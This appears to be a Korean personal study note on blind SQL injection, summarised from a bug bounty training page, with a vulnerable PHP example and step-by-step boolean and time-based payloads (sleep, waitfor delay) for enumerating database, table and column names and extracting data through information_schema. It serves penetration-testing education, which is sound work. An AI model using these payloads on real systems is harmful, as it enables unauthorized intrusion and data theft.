# Blind 기반 SQL Injection

개인 공부용으로 참고하기 위해서 버그바운티 클럽의 Pentest Gym에서 퍼온 사진과 글을 참고하여 정리한 문서입니다. 

| 출처 : https://www.bugbountyclub.com/pentestgym/view/55

# Blind SQL Injection 이란?
Blind SQL Injection은 사용자의 입력이 SQL 쿼리로 해석되기는 하나 웹 애플리케이션이 HTTP 응답에 어떠한 데이터나 데이터베이스 오류 메시지를 전혀 표시하지 않을 때 사용된다.
Error 기반 SQL Injection이나 UNION 기반 SQL Injection은 데이터베이스 오류 또는 원래 SQL 쿼리와의 의도된 통합을 통해 공격자가 추출하고자하는 데이터를 직접적으로 HTTP 응답에 노출시켰지만, Blind SQL Injection은 SQL 쿼리의 결과가 참 또는 거짓이냐에 따른 규칙적인 HTTP 응답의 차이를 기반으로 공격을 수행한다. 즉 공격자 입장에서는 요청이 참인지 거짓인지만 확인할 수 있다. 마치 20개의 질문과 질문에 대한 네 또는 아니요의 대답만 듣고 문제를 해결하는 스무고개와 비슷하다.

# Blind SQL Injection의 유형 및 동작 원리
## Boolean 기반
SQL 쿼리의 참/거짓 여부에 따라 HTTP 응답이 명시적으로 차이가 있을 때 사용가능하다. 대부분 참/거짓 여부에 따라 응답 내용에 차이가 있거나 HTTP 응답 상태코드가 500 또는 404로 다르다던지 등 쉽게 식별할 수 있는 차이가 있다.
하지만 어떤 경우에는 마침표 하나가 있고 없고 이러한 아주 미세한 차이만 있을 수도 있다. 어떤 경우라도 참/거짓에 따라 응답에 차이가 있다면 충분히 Boolean 기반 SQL Injection에 위협 받을 수 있다.

### 예제
게시글의 ID를 GET 매개변수로 받아 해당 게시글을 조회하는 PHP 예제
```bash
# 요청 URL
http://www.example.com/view.php?id=5

# PHP Source Code
$id = $_GET['id'];
$sql = "SELECT subject, content, author FROM board WHERE id=".$id;
```
id의 매개변수는 SQL 쿼리의 WHERE절에 사용된 숫자 타입의 컬럼과 연결되고 id 매개변수의 입력값은 SQL Injection에 취약하게 구현되어 SQL 쿼리로써 해석된다.
먼저 SQL 쿼리의 결과가 거짓이 되도록 다음과 같이 요청한다
```bash
http://www.example.com/view.php?id=5+AND+1%3D0--+      (URL인코딩된 5 AND 1=0-- )

# 다음과 같은 SQL 쿼리를 실행하도록 데이터베이스에 요청하여 결과를 받는다
SELECT subject, content, author FROM board WHERE id=5 AND 1=0-- ;
```
강제로 주입된 SQL 구문인 `AND 1=0--`에 의해 SQL 쿼리는 거짓이 되고 어떤 행도 반환하지 않는다. HTTP 응답에 아무런 게시글이 조회되지 않게 된다.
다음은 쿼리 결과가 참이 되는 요청을 수행
```bash
http://www.example.com/view.php?id=5+AND+1%3D1--+      (URL인코딩된 5 AND 1=1-- )

SELECT subject, content, author FROM board WHERE id=5 AND 1=1-- ;
```
참인 조건을 주입했으므로 SQL 쿼리는 참이되고 조작되지 않은 `id=5` 요청과 동일한 행을 반환하게 된다.
</br>
이와 같이 Blind SQL Injection은 SQL 쿼리의 결과가 참 또는 거짓인지 판단할 수 있는 점을 이용한다. 왠만한 데이터베이스에서 제공되는 `LENGTH(), SUBSTRING(), ASCII()`등의 함수를 이용해 특정 컬럼의 문자를 첫번째 부터 하나씩 차례대로 모든 문자와 비교하는 방법을 통해 최종적으로 모든 문자등을 추론할 수 있고, 이를 조합하여 원하는 데이터를 획득 가능하게 된다.

- 칼럼 길이 결정
```bash
5 AND LENGTH(컬럼명)=1--+                (결과:거짓)
5 AND LENGTH(컬럼명)=2--+                (결과:거짓)
5 AND LENGTH(컬럼명)=3--+                (결과:참)    <---컬럼의 길이는 3임.
```
- 문자 추론
```bash
# 첫번째 문자 추론
5 AND SUBSTRING(컬럼명,1,1)='a'--+       (결과:거짓)
5 AND SUBSTRING(컬럼명,1,1)='b'--+       (결과:참)    <---첫번째 문자: 'b'

# 두번째 문자 추론
5 AND SUBSTRING(컬럼명,2,1)='s'--+       (결과:거짓)
5 AND SUBSTRING(컬럼명,2,1)='t'--+       (결과:거짓)
5 AND SUBSTRING(컬럼명,2,1)='u'--+       (결과:참)    <---두번째 문자: 'u'

# 세번째 문자 추론
5 AND SUBSTRING(컬럼명,3,1)='f'--+       (결과:거짓)
5 AND SUBSTRING(컬럼명,3,1)='g'--+       (결과:참)    <---세번째 문자: 'g'
```
참으로만 나온 SQL 쿼리의 문자를 조합하면 bug 가 된다.

## Time(시간) 기반
SQL 쿼리의 참/거짓 여부에 따른 HTTP 응답의 차이를 육안으로 확인이 불가능하니 서버의 응답 시간 제어가 가능한 경우 사용된다. 공격자는 응답상에서 참/거짓을 판단할 수 있는 단서가 없으므로 참인 경우 의도적으로 서버의 응답을 지연시키는 함수를 주입하여 지정된 시간만큼 응답이 지연된다면 참으로 판단한다. SQL 쿼리에 서버의 응답 시간을 제어하기 위한 DBMS별 함수는 다음과 같다
```bash
MySQL (또는 MariaDB) - sleep()
MSSQL - waitfor delay 
Oracle - BEGIN dbms_lock.sleep(); END;
```

Boolean 기반의 공격과 같은 진입점으로 예를 든다. 단 이번에는 SQL 쿼리를 참/거짓 여부에 따른 응답에 차이가 없고 항상 동일한 경우이다.
```bash
http://www.example.com/view.php?id=5

# DBMS 별로 검사
# MySQL 또는 MariaDB
http://www.example.com/view.php?id=5 AND if(1=1,sleep(10),false)--+

# MSSQL
http://www.example.com/view.php?id=5 AND if (1=1) waitfor delay '0:0:10'--+

# Oracle
http://www.example.com/view.php?id=5 AND if 1=1 then BEGIN dbms_lock.sleep(10); END; end if--+
```
if문의 1=1은 참이므로 서버의 응답시간 10초 만큼 지연될 것이다. 공격은 Boolean과 거의 동일한 구문이 사용된다. 다음 예는 MySQL에 대한 예이며 다른 DBMS는 위와 같이 수정해서 사용하면 된다.
- 칼럼 길이 결정
```bash
5 AND if(LENGTH(컬럼명)=1, sleep(10), false)--+           (결과:거짓)
5 AND if(LENGTH(컬럼명)=2, sleep(10), false)--+           (결과:거짓)
5 AND if(LENGTH(컬럼명)=3, sleep(10), false)--+           (결과:참)  <--- 컬럼 길이는 3임.
```

- 문자 추론
```bash
# 첫번째 문자 추론
5 AND if(SUBSTRING(컬럼명,1,1)='a', sleep(10), false)--+  (결과:거짓)
5 AND if(SUBSTRING(컬럼명,1,1)='b', sleep(10), false)--+  (결과:참)  <--- 첫번째 문자 'b'

#  두번째 문자 추론
5 AND if(SUBSTRING(컬럼명,2,1)='s', sleep(10), false)--+  (결과:거짓)
5 AND if(SUBSTRING(컬럼명,2,1)='t', sleep(10), false)--+  (결과:거짓)
5 AND if(SUBSTRING(컬럼명,2,1)='u', sleep(10), false)--+  (결과:참)  <--- 두번째 문자 'u'

# 세번째 문자 추론
5 AND if(SUBSTRING(컬럼명,3,1)='f', sleep(10), false)--+  (결과:거짓)
5 AND if(SUBSTRING(컬럼명,3,1)='g', sleep(10), false)--+  (결과:참)  <--- 세번째 문자 'g'
```

# Boolean 기반 Blidn SQL Injection 테스트 방법
1. 데이터베이스와 통신하는 엔드포인트 식별
대상 웹 애플리케이션의 모든 기능을 사용해보고 데이터베이스와 통신하는 것으로 의심되는 모든 엔드포인트와 매개변수를 찾아 수집한다
만일 웹 애플리케이션 내에 다양한 사용자 권한이나 역할이 존재하고 서비스가 차등적으로 제공되나면 각 권한과 역할에 대한 모든 조합별로 사용자 계정을 생성해 웹 애플리케이션을 사용
공격 벡터느 GET 매개변수, POST body 매개변수, Cookie 등의 표준 요청 헤더나 커스텀 요청 헤더가 될 수 있음

2. 잠재적 취약 여부 검증
1.에서 수집한 진입점과 매개변수가 SQL Injection에 잠재적으로 취약한지 검사할 차례이다. **잠재적으로 취약하다는 의미는 사용자의 입력값이 SQL 쿼리로 해석되어 백엔드의 데이터베이스와 통신한다는 것을 의미**

SQL 쿼리를 참 또는 거짓으로 만들기 위해 다음과 같은 쌍의 입력값을 번갈아 사용해 제출한다 주석 문자(--) 뒤에 공백문자(+)가 있음을 유의한다.
```bash
# 문자형
1234' AND 1=1--+          (결과:참)
1234' AND 1=0--+          (결과:거짓)

1234' AND 'a'='a'--+      (결과:참)
1234' AND 'a'='b'--+      (결과:거짓)

# 숫자형 (홑따옴표 제거)
1234 AND 1=1--+           (결과:참)
1234 AND 1=0--+           (결과:거짓)
```

3. 데이터베이스 구조 파악
### 데이터베이스명
- 길이 결정
```bash
AND LENGTH(database())=1--+          (결과:거짓)     
AND LENGTH(database())=2--+          (결과:거짓)     
AND LENGTH(database())=N--+          (결과:참)      <--- 데이터베이스명의 길이는 N임.
```
- 각 문자 식별 : SQL 쿼리의 결과가 참이 나올때까지 아스키코드값을 대입하여 비교한다.
```bash
AND ASCII(SUBSTRING(database(),1,1))={여기에 모든 ASCII코드값(DEC) 대입}--+
AND ASCII(SUBSTRING(database(),2,1))={여기에 모든 ASCII코드값(DEC) 대입}--+ 
AND ASCII(SUBSTRING(database(),N,1))={여기에 모든 ASCII코드값(DEC) 대입}--+ 
```

### 테이블명
- 테이블 갯수 결정
```bash
AND (SELECT count(table_name) FROM information_schema.tables WHERE table_schema=database())=1--+     (거짓)
AND (SELECT count(table_name) FROM information_schema.tables WHERE table_schema=database())=2--+     (거짓)
AND (SELECT count(table_name) FROM information_schema.tables WHERE table_schema=database())=K--+     (참)   <--- 테이블 갯수는 K개임.
```
- 테이블명 길이 결정
```bash
AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=1--+          (거짓)     
AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=2--+          (거짓)     
AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=N--+          (참)      <--- 테이블명의 길이는 N임.
```
- 각 문자 식별
```bash
AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))={여기에 모든 ASCII코드값(DEC) 대입}--+
AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),2,1))={여기에 모든 ASCII코드값(DEC) 대입}--+ 
AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),N,1))={여기에 모든 ASCII코드값(DEC) 대입}--+ 
```

### 칼럼명
- 칼럼 갯수 결정
```bash
AND (SELECT count(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명')=1--+     (거짓)
AND (SELECT count(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명')=2--+     (거짓)
AND (SELECT count(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명')=K--+     (참)   <--- 컬럼 갯수는 K개임.
``` 
- 길이 결정
```bash
AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명' LIMIT 0,1))=1--+          (거짓)     
AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명' LIMIT 0,1))=2--+          (거짓)     
AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명' LIMIT 0,1))=N--+          (참)      <--- 첫번째 컬럼명의 길이는 N임.
```
- 각 문자 식별
```bash
AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명' LIMIT 0,1),1,1))={여기에 모든 ASCII코드값(DEC) 대입}--+
AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명' LIMIT 0,1),2,1))={여기에 모든 ASCII코드값(DEC) 대입}--+ 
AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명' LIMIT 0,1),N,1))={여기에 모든 ASCII코드값(DEC) 대입}--+ 
```

4. 데이터 추출
- 테이블 안의 행 갯수 결정
```bash
AND (SELECT count(*) FROM 테이블명)=1--+     (결과:거짓)
AND (SELECT count(*) FROM 테이블명)=2--+     (결과:거짓)
AND (SELECT count(*) FROM 테이블명)=K--+     (결과:참)   <--- 테이블 행의 갯수는 K개임.
```
- 길이 결정
```bash
AND LENGTH((SELECT 컬럼명 FROM 테이블명 LIMIT 0,1))=1--+      (결과:거짓)     
AND LENGTH((SELECT 컬럼명 FROM 테이블명 LIMIT 0,1))=2--+      (결과:거짓)     
AND LENGTH((SELECT 컬럼명 FROM 테이블명 LIMIT 0,1))=N--+      (결과:참)
```
- 각 문자 식별
```bash
AND ASCII(SUBSTRING((SELECT 컬럼명 FROM 테이블명 LIMIT 0,1),1,1))={여기에 모든 ASCII코드값(DEC) 대입}--+
AND ASCII(SUBSTRING((SELECT 컬럼명 FROM 테이블명 LIMIT 0,1),2,1))={여기에 모든 ASCII코드값(DEC) 대입}--+ 
AND ASCII(SUBSTRING((SELECT 컬럼명 FROM 테이블명 LIMIT 0,1),N,1))={여기에 모든 ASCII코드값(DEC) 대입}--+  
```

# Time 기반 Blind SQL Injection 테스트 방법
1. 데이터베이스와 통신하는 엔드포인트 식별
Boolean과 동일
2. 잠재적 취약 여부 검증
SQL 쿼리의 결과가 참/거짓에 따라 HTTP 응답 내용에서는 차이를 찾을 수 없으니 서버의 응답 시간을 제어할 수 있는지 시도. 만약 시간 지연이 발생한다면 Time 기반 SQL Injection에 취약하다
```bash
AND if(1=1,sleep(10),false)--+      (결과:참)    <--- 시간 지연 발생
AND if(1=0,sleep(10),false)--+      (결과:거짓)   
```
3. 데이터베이스 구조 파악
### 데이터베이스명
- 길이 결정
```bash
AND if(LENGTH(database())=1, sleep(10), false)--+      (결과:거짓)     
AND if(LENGTH(database())=2, sleep(10), false)--+      (결과:거짓)     
AND if(LENGTH(database())=N, sleep(10), false)--+      (결과:참)      <--- 데이터베이스명의 길이는 N임.
```
- 각 문자 식별 : SQL 쿼리의 결과가 참이 나올때까지 아스키코드값을 대입하여 비교한다.
```bash
AND if(ASCII(SUBSTRING(database(),1,1))={여기에 모든 ASCII코드값(DEC) 대입}, sleep(10), false)--+
AND if(ASCII(SUBSTRING(database(),2,1))={여기에 모든 ASCII코드값(DEC) 대입}, sleep(10), false)--+ 
AND if(ASCII(SUBSTRING(database(),N,1))={여기에 모든 ASCII코드값(DEC) 대입}, sleep(10), false)--+ 
```

### 테이블명
- 테이블 갯수 결정
```bash
AND if((SELECT count(table_name) FROM information_schema.tables WHERE table_schema=database())=1,sleep(10),false)--+     (거짓)
AND if((SELECT count(table_name) FROM information_schema.tables WHERE table_schema=database())=2,sleep(10),false)--+     (거짓)
AND if((SELECT count(table_name) FROM information_schema.tables WHERE table_schema=database())=K,sleep(10),false)--+     (참)   <--- 테이블 갯수는 K개임.
```
- 테이블명 길이 결정
```bash
AND if(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=1, sleep(10), false)--+          (거짓)     
AND if(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=2, sleep(10), false)--+          (거짓)     
AND if(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=N, sleep(10), false)--+          (참)      <--- 테이블명의 길이는 N임.
```
- 각 문자 식별
```bash
AND if(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))={여기에 모든 ASCII코드값(DEC) 대입}, sleep(10), false)--+
AND if(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),2,1))={여기에 모든 ASCII코드값(DEC) 대입}, sleep(10), false)--+ 
AND if(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),N,1))={여기에 모든 ASCII코드값(DEC) 대입}, sleep(10), false)--+ 
```

### 칼럼명
- 칼럼 갯수 결정
```bash
AND if((SELECT count(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명')=1,sleep(10),false)--+     (거짓)
AND if((SELECT count(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명')=2,sleep(10),false)--+     (거짓)
AND if((SELECT count(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명')=K,sleep(10),false)--+     (참)   <--- 컬럼 갯수는 K개임.
``` 
- 길이 결정
```bash
AND if(LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명' LIMIT 0,1))=1, sleep(10), false)--+          (거짓)     
AND if(LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명' LIMIT 0,1))=2, sleep(10), false)--+          (거짓)     
AND if(LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명' LIMIT 0,1))=N, sleep(10), false)--+          (참)      <--- 첫번째 컬럼명의 길이는 N임.
```
- 각 문자 식별
```bash
AND if(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명' LIMIT 0,1),1,1))={여기에 모든 ASCII코드값(DEC) 대입}, sleep(10), false)--+
AND if(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명' LIMIT 0,1),2,1))={여기에 모든 ASCII코드값(DEC) 대입}, sleep(10), false)--+ 
AND if(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='테이블명' LIMIT 0,1),N,1))={여기에 모든 ASCII코드값(DEC) 대입}, sleep(10), false)--+ 
```

4. 데이터 추출
- 테이블 안의 행 갯수 결정
```bash
AND if((SELECT count(*) FROM 테이블명)=1,sleep(10),false)--+     (결과:거짓)
AND if((SELECT count(*) FROM 테이블명)=2,sleep(10),false)--+     (결과:거짓)
AND if((SELECT count(*) FROM 테이블명)=K,sleep(10),false)--+     (결과:참)   <--- 테이블 행의 갯수는 K개임.
```
- 길이 결정
```bash
AND if(LENGTH((SELECT 컬럼명 FROM 테이블명 LIMIT 0,1))=1, sleep(10), false)--+      (결과:거짓)     
AND if(LENGTH((SELECT 컬럼명 FROM 테이블명 LIMIT 0,1))=2, sleep(10), false)--+      (결과:거짓)     
AND if(LENGTH((SELECT 컬럼명 FROM 테이블명 LIMIT 0,1))=N, sleep(10), false)--+      (결과:참)      <--- 첫번째 컬럼명의 길이는 N임.
```
- 각 문자 식별
```bash
AND if(ASCII(SUBSTRING((SELECT 컬럼명 FROM 테이블명 LIMIT 0,1),1,1))={여기에 모든 ASCII코드값(DEC) 대입}, sleep(10), false)--+
AND if(ASCII(SUBSTRING((SELECT 컬럼명 FROM 테이블명 LIMIT 0,1),2,1))={여기에 모든 ASCII코드값(DEC) 대입}, sleep(10), false)--+ 
AND if(ASCII(SUBSTRING((SELECT 컬럼명 FROM 테이블명 LIMIT 0,1),N,1))={여기에 모든 ASCII코드값(DEC) 대입}, sleep(10), false)--+ 
```

